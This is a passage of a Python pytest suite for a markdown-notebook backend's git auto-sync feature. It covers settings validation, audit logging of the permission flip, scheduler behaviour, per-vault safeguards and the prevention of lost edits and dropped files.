    (1440) intact, so the interval assertions below hold with a wide margin
    instead of depending on the scheduler's cooperation.
    """
    from kiro_crew.apps.builtins.md_notebook import syncer as syncer_mod

    monkeypatch.setattr(syncer_mod, "TICK_SEC", 0.005)
    monkeypatch.setattr(syncer_mod, "SECONDS_PER_MINUTE", 0.005)
    return syncer_mod


@asynccontextmanager
async def running_syncer(syncer_mod) -> AsyncIterator[None]:
    """Arm the loop and guarantee it is cancelled, even when the test fails.

    A loop left running leaks a task into the next test's event loop, which
    surfaces as some unrelated test failing rather than this one.
    """
    await syncer_mod.start_syncer(web.Application())
    try:
        yield
    finally:
        await syncer_mod.stop_syncer(web.Application())


@pytest.mark.asyncio
async def test_settings_default_when_the_file_is_absent(fixtures) -> None:
    server_mod, _remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        status, body = await client.get("/api/settings")
        assert status == 200, body
        assert body["settings"] == _default_settings_body(server_mod)
        # autoSync defaults OFF, and that default is the authorization boundary:
        # enabling it is what lets the backend push to a remote unattended.
        assert body["settings"]["autoSync"] is False


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "sent,expected",
    [(0, 1), (-30, 1), (1, 1), (10, 10), (1440, 1440), (99999, 1440)],
)
async def test_settings_put_clamps_the_interval(fixtures, sent: int, expected: int) -> None:
    """Out-of-range minutes are clamped, and 0 is the one that matters: an
    unclamped 0 would make the scheduler a busy loop pushing continuously."""
    server_mod, _remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        status, body = await client.put("/api/settings", {"autoSyncMins": sent})
        assert status == 200, body
        assert body["settings"]["autoSyncMins"] == expected
        # The clamped value is what was PERSISTED, not just what was echoed.
        status, body = await client.get("/api/settings")
        assert body["settings"]["autoSyncMins"] == expected


@pytest.mark.asyncio
@pytest.mark.parametrize("sent", ["soon", "10", None, True, 10.5, [], {}])
async def test_settings_put_rejects_a_non_integer_interval(fixtures, sent: Any) -> None:
    """A value that is not a whole number of minutes carries no interval to
    clamp, so it is refused rather than silently replaced with a default."""
    server_mod, _remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        status, body = await client.put("/api/settings", {"autoSyncMins": sent})
        assert status == 400, body
        assert body["code"] == "invalid_auto_sync_mins"
        status, body = await client.get("/api/settings")
        assert body["settings"]["autoSyncMins"] == server_mod.DEFAULT_AUTO_SYNC_MINS


@pytest.mark.asyncio
async def test_settings_put_rejects_a_non_boolean_auto_sync(fixtures) -> None:
    """A truthy string must not enable unattended pushing."""
    server_mod, _remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        status, body = await client.put("/api/settings", {"autoSync": "yes"})
        assert status == 400, body
        assert body["code"] == "invalid_auto_sync"
        status, body = await client.get("/api/settings")
        assert body["settings"]["autoSync"] is False


@pytest.mark.asyncio
async def test_settings_put_drops_unknown_keys(fixtures) -> None:
    """A stale or hostile client must not be able to grow the file."""
    server_mod, _remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        status, body = await client.put(
            "/api/settings", {"autoSync": True, "pushAnywhere": True, "vaults": []}
        )
        assert status == 200, body
        assert body["settings"] == {
            "autoSync": True,
            "autoSyncMins": server_mod.DEFAULT_AUTO_SYNC_MINS,
            "lastSync": {},
        }
        stored = json.loads(server_mod._settings_json().read_text(encoding="utf-8"))
        assert set(stored) == {"autoSync", "autoSyncMins", "lastSync"}


@pytest.mark.asyncio
async def test_settings_writes_apply_in_arrival_order(fixtures) -> None:
    """Ordering is the server's job, done by arrival order under the settings
    lock — the client sends no ordering token. The last write the server accepts
    wins, and a disable always applies, so auto-sync can never stay authorized
    against a user (or another tab) that turned it off."""
    server_mod, _remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        status, body = await client.put("/api/settings", {"autoSync": True})
        assert status == 200, body
        assert body["settings"]["autoSync"] is True
        # A disable is never dropped — revocation always applies.
        status, body = await client.put("/api/settings", {"autoSync": False})
        assert status == 200, body
        assert body["settings"]["autoSync"] is False
        _, get_body = await client.get("/api/settings")
        assert get_body["settings"]["autoSync"] is False
        # The last write the server accepts wins.
        status, body = await client.put("/api/settings", {"autoSync": True})
        assert status == 200, body
        assert body["settings"]["autoSync"] is True


@pytest.mark.asyncio
async def test_auto_sync_permission_flip_is_audited(fixtures) -> None:
    """Enabling autoSync authorizes unattended `git push`; the permission flip
    MUST leave a SEL record. A no-op re-write (True->True) writes nothing."""
    from kiro_crew.sel import sel

    server_mod, _remote, _seed = fixtures
    fingerprint = "autoSyncMins=1439"  # unique to this test, so it isolates its events

    def flip_outcomes() -> list[str]:
        return [
            e.get("outcome")
            for e in sel().recent(limit=1000)
            if e.get("operation") == "md_notebook.settings.autoSync"
            and fingerprint in (e.get("resources") or "")
        ]

    async with signed_client(server_mod) as client:
        await client.put("/api/settings", {"autoSync": True, "autoSyncMins": 1439})
        await client.put("/api/settings", {"autoSync": True})  # no change -> no event
        await client.put("/api/settings", {"autoSync": False})
    outcomes = flip_outcomes()
    assert outcomes.count("enabled") == 1, outcomes
    assert outcomes.count("disabled") == 1, outcomes


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "raw",
    [
        "[]",
        '"autoSync"',
        "null",
        "42",
        "{ not json at all",
        '{"autoSync": "yes", "autoSyncMins": "ten", "lastSync": 7}',
    ],
)
async def test_a_corrupt_settings_file_degrades_to_defaults(fixtures, raw: str) -> None:
    """The file sits in an agent-writable directory, so its shape AND its fields
    are untrusted — a broken document must degrade rather than 500 the endpoint,
    and a truthy-but-not-boolean autoSync must fail toward NOT pushing."""
    server_mod, _remote, _seed = fixtures
    _write_raw_settings(server_mod, raw)
    async with signed_client(server_mod) as client:
        status, body = await client.get("/api/settings")
        assert status == 200, body
        assert body["settings"] == _default_settings_body(server_mod)


@pytest.mark.asyncio
async def test_a_mangled_last_sync_entry_does_not_cost_the_others(fixtures) -> None:
    """Per-entry filtering: one bad timestamp must not erase every vault's."""
    server_mod, _remote, _seed = fixtures
    _write_raw_settings(
        server_mod,
        json.dumps(
            {
                "lastSync": {
                    "good": 1700000000000,
                    "stringy": "nope",
                    "negative": -1,
                    "flag": True,
                }
            }
        ),
    )
    async with signed_client(server_mod) as client:
        status, body = await client.get("/api/settings")
        assert status == 200, body
        assert body["settings"]["lastSync"] == {"good": 1700000000000}


@pytest.mark.asyncio
async def test_settings_put_refuses_a_client_supplied_last_sync(fixtures) -> None:
    """lastSync is server-owned: a client sending one is claiming a sync
    happened, and accepting it would show a backup time nothing earned."""
    server_mod, _remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        status, body = await client.put(
            "/api/settings", {"autoSync": True, "lastSync": {"v1": 1700000000000}}
        )
        assert status == 400, body
        assert body["code"] == "last_sync_read_only"
        status, body = await client.get("/api/settings")
        assert body["settings"]["lastSync"] == {}
        # Refused outright, so the autoSync riding along in the same request
        # did not land either.
        assert body["settings"]["autoSync"] is False


@pytest.mark.asyncio
async def test_a_rejected_settings_request_changes_nothing(fixtures) -> None:
    """Validation is two-phase. This pair is why it matters: a request that
    enabled autoSync and then 400'd on the interval would leave unattended
    pushing on, from a request the user was told had failed."""
    server_mod, _remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        status, body = await client.put(
            "/api/settings", {"autoSync": True, "autoSyncMins": "whenever"}
        )
        assert status == 400, body
        assert body["code"] == "invalid_auto_sync_mins"
        status, body = await client.get("/api/settings")
        assert body["settings"]["autoSync"] is False


@pytest.mark.asyncio
async def test_create_app_wires_the_auto_sync_loop(fixtures) -> None:
    """The loop is armed by the backend app, not by a page: wired to a page's
    lifecycle it would stop the moment the Notes tab closed, which is the whole
    defect this replaces."""
    server_mod, _remote, _seed = fixtures
    from kiro_crew.apps.builtins.md_notebook import syncer as syncer_mod

    app = server_mod.create_app()
    assert syncer_mod.start_syncer in app.on_startup
    assert syncer_mod.stop_syncer in app.on_cleanup


@pytest.mark.asyncio
async def test_the_loop_starts_and_stops_with_the_app(fixtures, loop_syncer) -> None:
    server_mod, _remote, _seed = fixtures
    async with signed_client(server_mod):
        task = loop_syncer._sync_task
        assert task is not None and not task.done()
    assert loop_syncer._sync_task is None
    assert task.done()


@pytest.mark.asyncio
async def test_starting_the_loop_twice_is_a_no_op(fixtures, loop_syncer) -> None:
    """A second arm must not create a second loop: two loops committing in one
    working tree race on index.lock and one of them loses its notes."""
    server_mod, _remote, _seed = fixtures
    async with running_syncer(loop_syncer):
        first = loop_syncer._sync_task
        await loop_syncer.start_syncer(web.Application())
        assert loop_syncer._sync_task is first


@pytest.mark.asyncio
async def test_the_loop_does_nothing_while_auto_sync_is_off(
    fixtures, loop_syncer, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The opt-in gate. The second half is the control — without it, a loop that
    never ran at all would pass the first half just as well."""
    server_mod, _remote, _seed = fixtures
    cycles: list[int] = []

    async def _count(*_a: Any) -> None:
        cycles.append(1)

    monkeypatch.setattr(loop_syncer, "_sync_once", _count)
    _write_raw_settings(server_mod, json.dumps({"autoSync": False, "autoSyncMins": 1}))
    async with running_syncer(loop_syncer):
        # Many ticks at a (compressed) one-minute interval: without the gate this
        # window would have produced dozens of pushes.
        await asyncio.sleep(0.2)
        assert cycles == []

        _write_raw_settings(server_mod, json.dumps({"autoSync": True, "autoSyncMins": 1}))
        await _wait_for(lambda: cycles, "enabling autoSync never produced a sync cycle")


@pytest.mark.asyncio
async def test_the_loop_picks_up_a_changed_interval_without_a_restart(
    fixtures, loop_syncer, monkeypatch: pytest.MonkeyPatch
) -> None:
    """settings.json is re-read every cycle, so shortening the interval takes
    effect on the running loop instead of at the next gateway start."""
    server_mod, _remote, _seed = fixtures
    cycles: list[int] = []

    async def _count(*_a: Any) -> None:
        cycles.append(1)

    monkeypatch.setattr(loop_syncer, "_sync_once", _count)
    # The longest selectable interval: nothing is due for a compressed day.
    _write_raw_settings(server_mod, json.dumps({"autoSync": True, "autoSyncMins": 1440}))
    async with running_syncer(loop_syncer):
        await asyncio.sleep(0.2)
        assert cycles == [], "synced before the configured interval had elapsed"

        # Shortened while the loop runs — no restart of the loop or the gateway.
        _write_raw_settings(server_mod, json.dumps({"autoSync": True, "autoSyncMins": 1}))
        await _wait_for(lambda: cycles, "a shortened interval never took effect")


@pytest.mark.asyncio
async def test_a_raising_vault_does_not_stop_the_others(
    fixtures, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Per-vault containment: an unreachable remote costs that vault one cycle,
    not auto-sync for every other vault until the gateway restarts."""
    server_mod, _remote, _seed = fixtures
    from kiro_crew.apps.builtins.md_notebook import syncer as syncer_mod

    await server_mod.write_vaults(
        [
            {"id": "boom", "localPath": "/vaults/boom"},
            {"id": "fine", "localPath": "/vaults/fine"},
        ]
    )
    synced: list[str] = []

    async def _sync(local_path: str, **kwargs: Any) -> dict[str, Any]:
        if local_path == "/vaults/boom":
            raise git_ops.GitError("remote unreachable")
        synced.append(local_path)
        return _clean_result()

    monkeypatch.setattr(git_ops, "sync", _sync)
    monkeypatch.setattr(server_mod, "rebuild_cache", _noop_rebuild)
    monkeypatch.setattr(server_mod, "resolve_auth", _no_auth)

    await syncer_mod._sync_once()

    assert synced == ["/vaults/fine"]
    settings = await server_mod.read_settings()
    assert list(settings["lastSync"]) == ["fine"]


@pytest.mark.asyncio
async def test_the_loop_skips_read_only_vaults(
    fixtures, monkeypatch: pytest.MonkeyPatch
) -> None:
    """sync commits, merges and pushes — all writes — so a read-only vault must
    not reach it, exactly as on the manual path."""
    server_mod, _remote, _seed = fixtures
    from kiro_crew.apps.builtins.md_notebook import syncer as syncer_mod

    await server_mod.write_vaults(
        [
            {"id": "ro", "localPath": "/vaults/ro", "readOnly": True},
            {"id": "rw", "localPath": "/vaults/rw"},
        ]
    )
    synced: list[str] = []

    async def _sync(local_path: str, **kwargs: Any) -> dict[str, Any]:
        synced.append(local_path)
        return _clean_result()

    monkeypatch.setattr(git_ops, "sync", _sync)
    monkeypatch.setattr(server_mod, "rebuild_cache", _noop_rebuild)
    monkeypatch.setattr(server_mod, "resolve_auth", _no_auth)

    await syncer_mod._sync_once()

    assert synced == ["/vaults/rw"]
    assert list((await server_mod.read_settings())["lastSync"]) == ["rw"]


@pytest.mark.asyncio
async def test_a_vault_forgotten_mid_cycle_is_skipped(
    fixtures, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The cycle snapshots the vault list at the top; a vault the user FORGETS
    mid-cycle has had its authorization revoked and must not be pushed from the
    stale snapshot. It is skipped while the still-connected vaults sync."""
    server_mod, _remote, _seed = fixtures
    from kiro_crew.apps.builtins.md_notebook import syncer as syncer_mod

    full = [
        {"id": "a", "localPath": "/vaults/a"},
        {"id": "b", "localPath": "/vaults/b"},
        {"id": "c", "localPath": "/vaults/c"},
    ]
    reduced = [full[0], full[2]]  # 'b' forgotten after the cycle's opening snapshot
    calls = {"n": 0}

    async def _read_vaults() -> list[dict[str, Any]]:
        calls["n"] += 1
        # First call is the cycle's opening snapshot (sees all three); every
        # per-vault live re-read afterwards sees 'b' gone.
        return full if calls["n"] == 1 else reduced

    synced: list[str] = []

    async def _sync(local_path: str, **kwargs: Any) -> dict[str, Any]:
        synced.append(local_path)
        return _clean_result()

    monkeypatch.setattr(server_mod, "read_vaults", _read_vaults)
    monkeypatch.setattr(git_ops, "sync", _sync)
    monkeypatch.setattr(server_mod, "rebuild_cache", _noop_rebuild)
    monkeypatch.setattr(server_mod, "resolve_auth", _no_auth)

    await syncer_mod._sync_once()

    # 'b' is skipped; 'a' and 'c' — still in the live registry — are pushed.
    assert synced == ["/vaults/a", "/vaults/c"]


@pytest.mark.asyncio
async def test_a_mid_cycle_revocation_stops_the_remaining_vaults(
    fixtures, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A cycle pushes every vault in turn; disabling auto-sync mid-cycle must stop
    the run rather than finish pushing the rest against a revoked authorization."""
    server_mod, _remote, _seed = fixtures
    from kiro_crew.apps.builtins.md_notebook import syncer as syncer_mod

    await server_mod.write_vaults(
        [
            {"id": "a", "localPath": "/vaults/a"},
            {"id": "b", "localPath": "/vaults/b"},
            {"id": "c", "localPath": "/vaults/c"},
        ]
    )
    synced: list[str] = []

    async def _sync(local_path: str, **kwargs: Any) -> dict[str, Any]:
        synced.append(local_path)
        return _clean_result()

    monkeypatch.setattr(git_ops, "sync", _sync)
    monkeypatch.setattr(server_mod, "rebuild_cache", _noop_rebuild)
    monkeypatch.setattr(server_mod, "resolve_auth", _no_auth)

    # Authorized for the first vault, revoked before the second — the gate the
    # loop passes in. The run must push 'a' and then stop, never reaching 'b'/'c'.
    calls = {"n": 0}

    async def _still_enabled() -> bool:
        calls["n"] += 1
        return calls["n"] == 1

    await syncer_mod._sync_once(_still_enabled)

    assert synced == ["/vaults/a"]


@pytest.mark.asyncio
async def test_the_loop_passes_the_anti_tamper_pins(
    fixtures, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The unattended path must carry the same remote/gitdir pins as the manual
    one. Nobody is watching this run, so a repointed remote that was not refused
    would send the user's notes somewhere new with no step to intervene at."""
    server_mod, _remote, _seed = fixtures
    from kiro_crew.apps.builtins.md_notebook import syncer as syncer_mod

    vault = {
        "id": "v1",
        "localPath": "/vaults/v1",
        "branch": "main",
        "subfolder": "notes",
        "remoteUrl": "https://example.invalid/repo.git",
        "gitDir": "/vaults/v1/.git",
        "localOnly": False,
    }
    await server_mod.write_vaults([vault])
    seen: list[dict[str, Any]] = []

    async def _sync(local_path: str, **kwargs: Any) -> dict[str, Any]:
        seen.append({"localPath": local_path, **kwargs})
        return _clean_result()

    monkeypatch.setattr(git_ops, "sync", _sync)
    monkeypatch.setattr(server_mod, "rebuild_cache", _noop_rebuild)
    monkeypatch.setattr(server_mod, "resolve_auth", _no_auth)

    await syncer_mod._sync_once()

    assert seen == [
        {
            "localPath": "/vaults/v1",
            "branch": "main",
            "pat": None,
            "subfolder": "notes",
            "trusted_remote": "https://example.invalid/repo.git",
            "trusted_gitdir": "/vaults/v1/.git",
            "local_only": False,
            # A timer chose this run, so it stages notes ONLY even though it
            # pushes — a stray non-note file must not reach the remote unasked.
            "notes_only": True,
        }
    ]


@pytest.mark.asyncio
async def test_conflicts_do_not_record_a_sync_time(
    fixtures, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A conflicted merge was aborted and pushed nothing, so stamping it would
    tell the user their notes are backed up when they are still only local."""
    server_mod, _remote, _seed = fixtures
    from kiro_crew.apps.builtins.md_notebook import syncer as syncer_mod

    await server_mod.write_vaults([{"id": "v1", "localPath": "/vaults/v1"}])

    async def _sync(local_path: str, **kwargs: Any) -> dict[str, Any]:
        return {
            "pushed": False,
            "pulled": False,
            "committed": [],
            "conflicts": [{"path": "One.md", "local": "a", "remote": "b"}],
        }

    monkeypatch.setattr(git_ops, "sync", _sync)
    monkeypatch.setattr(server_mod, "rebuild_cache", _noop_rebuild)
    monkeypatch.setattr(server_mod, "resolve_auth", _no_auth)

    await syncer_mod._sync_once()

    assert (await server_mod.read_settings())["lastSync"] == {}


@pytest.mark.asyncio
async def test_a_cycle_never_overlaps_the_previous_one(
    fixtures, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Two concurrent commits in one repository race on index.lock, and the
    loser drops that cycle's notes from history."""
    server_mod, _remote, _seed = fixtures
    from kiro_crew.apps.builtins.md_notebook import syncer as syncer_mod

    await server_mod.write_vaults([{"id": "v1", "localPath": "/vaults/v1"}])
    started = asyncio.Event()
    release = asyncio.Event()
    calls: list[int] = []

    async def _slow_sync(local_path: str, **kwargs: Any) -> dict[str, Any]:
        calls.append(1)
        started.set()
        await release.wait()
        return _clean_result()

    monkeypatch.setattr(git_ops, "sync", _slow_sync)
    monkeypatch.setattr(server_mod, "rebuild_cache", _noop_rebuild)
    monkeypatch.setattr(server_mod, "resolve_auth", _no_auth)

    first = asyncio.create_task(syncer_mod._sync_once())
    await started.wait()
    # A second entrant while the first cycle is mid-flight returns without
    # touching the vault.
    await syncer_mod._sync_once()
    assert calls == [1]
    release.set()
    await first
    assert calls == [1]


@pytest.mark.asyncio
async def test_manual_sync_records_and_returns_the_sync_time(fixtures) -> None:
    """Deliverable of the single-writer rule: the handler stamps lastSync and
    hands it back, so the UI updates without a second round-trip."""
    server_mod, remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        vault = await _clone(client, remote)
        status, body = await client.post(f"/api/sync?vault={vault['id']}", {})
        assert status == 200, body
        stamped = body["lastSync"]
        assert isinstance(stamped, int) and stamped > 0

        status, body = await client.get("/api/settings")
        assert status == 200, body
        assert body["settings"]["lastSync"][vault["id"]] == stamped


@pytest.mark.asyncio
async def test_a_conflicted_manual_sync_reports_no_sync_time(fixtures) -> None:
    """Same rule on the manual path: a conflict earns no timestamp."""
    server_mod, remote, seed = fixtures
    async with signed_client(server_mod) as client:
        vault = await _clone(client, remote)
        (seed / "One.md").write_text("# One\n\nREMOTE side\n", encoding="utf-8")
        _git("add", "-A", cwd=seed)
        _git("commit", "-m", "remote", cwd=seed)
        _git("push", "origin", "main", cwd=seed)
        await client.put("/api/note", {"path": "One.md", "content": "# One\n\nLOCAL side\n"})

        status, body = await client.post(f"/api/sync?vault={vault['id']}", {})
        assert status == 200, body
        assert body["result"]["conflicts"], "expected a conflicted sync to test"
        assert body["lastSync"] is None

        status, body = await client.get("/api/settings")
        assert body["settings"]["lastSync"] == {}


# -- #4899 exact-head review blockers ----------------------------------------
#
# `status()` may hide a path on ONE ground: this process currently knows it owns
# the temp. The name shape is not ownership evidence -- `<name>.<32 hex>.tmp` is
# what `staged_temp_name` produces, not a shape only it can produce -- so the
# cases below pin both directions.

NL = chr(10)
HEX32 = "0123456789abcdef0123456789abcdef"


def _seed_vault(tmp_path: Path, *files: str) -> Path:
    repo = tmp_path / "vault"
    repo.mkdir()

    def git(*args: str) -> None:
        subprocess.run(["git", *args], cwd=repo, check=True, capture_output=True)

    git("init", "-q")
    git("config", "user.email", "t@example.com")
    git("config", "user.name", "T")
    for name in files:
        (repo / name).write_text("seeded " + name + NL, encoding="utf-8")
    git("add", "-A")
    git("commit", "-qm", "seed")
    return repo


@pytest.mark.asyncio
async def test_a_genuine_user_file_in_the_temp_shape_stays_visible(
    tmp_path: Path,
) -> None:
    """A user file NAMED like a staged temp is still the user's file.

    `<name>.<32 hex>.tmp` is the shape this module produces; nothing stops a
    user or another tool from producing it too. Hiding it on the shape alone
    withheld real content from the user's own repository -- absent from the
    pending badge, from the commit, and from the remote, with nothing to say it
    had been dropped. Withholding unknown filesystem content is a worse failure
    than committing a stray temp, so shape alone must not hide anything.
    """
    repo = _seed_vault(tmp_path, "Report.md")
    genuine = "Report.md." + HEX32 + ".tmp"
    (repo / genuine).write_text("a real file the user made" + NL, encoding="utf-8")

    # The origin is untouched: nothing here looks like a rename.
    assert (repo / "Report.md").exists()

    kinds = {c.path: c.kind for c in await git_ops.status(str(repo))}
    assert kinds.get(genuine) == "added", (
        "status() hid a genuine user file because its NAME matched the staged-temp "
        "shape, so it would never be committed or pushed: %r" % (kinds,)
    )


@pytest.mark.asyncio
async def test_a_registered_in_flight_temp_is_hidden(tmp_path: Path) -> None:
    """The one ground for hiding a path: this process owns it right now."""
    repo = _seed_vault(tmp_path, "Note.md")
    tmp_name = git_ops.staged_temp_name("Note.md")
    (repo / tmp_name).write_text("in flight" + NL, encoding="utf-8")

    with git_ops.inflight_temp(repo / tmp_name):
        paths = {c.path for c in await git_ops.status(str(repo))}
        assert tmp_name not in paths, (
            "a temp this process is publishing reached status(): %r" % (paths,)
        )

    # Ownership ended, so the file is ordinary content again rather than being
    # withheld forever. An orphan becoming visible is the safe failure direction.
    paths = {c.path for c in await git_ops.status(str(repo))}
    assert tmp_name in paths, (
        "a temp stayed hidden after its transaction ended, so an orphan could "
        "never be seen or cleaned by the user: %r" % (paths,)
    )


@pytest.mark.asyncio
async def test_a_rename_into_the_temp_shape_commits_both_halves(
    tmp_path: Path,
) -> None:
    """A tracked file renamed into the temp shape must not lose either half.

    The rename does not arrive as git's `R` record: the renamed file is
    untracked, so `diff HEAD` reports only the old path as deleted and the new
    path turns up in `ls-files --others`. Dropping the addition on shape left
    the deletion standing alone, and the autosave committed the move as a
    REMOVAL -- the file disappears from the remote while still sitting in the
    vault under its new name.
    """
    repo = _seed_vault(tmp_path, "Note.md")
    renamed_name = git_ops.staged_temp_name("Note.md")
    (repo / "Note.md").rename(repo / renamed_name)

    kinds = {c.path: c.kind for c in await git_ops.status(str(repo))}
    assert kinds.get("Note.md") == "deleted", (
        "the rename's deleted half vanished from status(): %r" % (kinds,)
    )
    assert kinds.get(renamed_name) == "added", (
        "status() dropped the rename's ADDED half while keeping its deletion, so "
        "a Sync would commit this move as a removal: %r" % (kinds,)
    )


@pytest.mark.asyncio
async def test_a_tokenless_retry_refuses_to_overwrite_an_external_edit(
    fixtures, tmp_path: Path
) -> None:
    """A save with no ``baseMtime`` must not republish over an edit made in its gap.

    ``_assert_note_is_fresh`` is a no-op without a client token, and the note
    lock only serializes API writers -- an editor writing the file directly
    (Obsidian, ``git pull``, a script) never takes it. So a contended rename that
    backs off and retries used to rename over whatever landed in the meantime and
    answer 200, destroying a newer edit with no conflict reported.

    The server therefore samples its OWN baseline before the first attempt and
    revalidates against it before every retry. Deterministic: the external write
    is performed from inside the injected backoff, so it is guaranteed to land
    between attempt 1 and attempt 2.
    """
    _mod, _remote, _seed = fixtures

    root = tmp_path / "tokenless-vault"
    root.mkdir()
    target = root / "One.md"
    target.write_text("original" + NL, encoding="utf-8")

    real_replace = os.replace
    real_sleep = asyncio.sleep
    attempts: list[str] = []

    def contended_once(src, dst, *args, **kwargs):  # type: ignore[no-untyped-def]
        if str(dst).endswith("One.md"):
            attempts.append(str(src))
            if len(attempts) == 1:
                raise PermissionError(32, "The process cannot access the file")
        return real_replace(src, dst, *args, **kwargs)

    async def external_write_during_backoff(delay):  # type: ignore[no-untyped-def]
        # THE external editor: lands in the retry gap, holds no lock, and leaves
        # a strictly newer mtime.
        if attempts:
            target.write_text("edited in obsidian" + NL, encoding="utf-8")
            future = time.time() + 5
            os.utime(target, (future, future))
        await real_sleep(0)

    with pytest.MonkeyPatch.context() as mp:
        mp.setattr(os, "replace", contended_once)
        mp.setattr(_mod.platform_compat, "IS_WINDOWS", True)
        mp.setattr(_mod.asyncio, "sleep", external_write_during_backoff)

        with pytest.raises(_mod.ApiError) as excinfo:
            await _mod._save_note_contents(target, "One.md", "my save" + NL, None)

    assert excinfo.value.status == 409, (
        "a tokenless retry answered %r instead of a conflict" % (excinfo.value.status,)
    )
    assert target.read_text(encoding="utf-8") == "edited in obsidian" + NL, (
        "the tokenless retry republished over an external edit made during its "
        "backoff -- the edit is gone and the client was never told"
    )
    leftovers = sorted(p.name for p in root.glob("One.md.*.tmp"))
    assert not leftovers, "the refused save left its temp behind: %r" % (leftovers,)
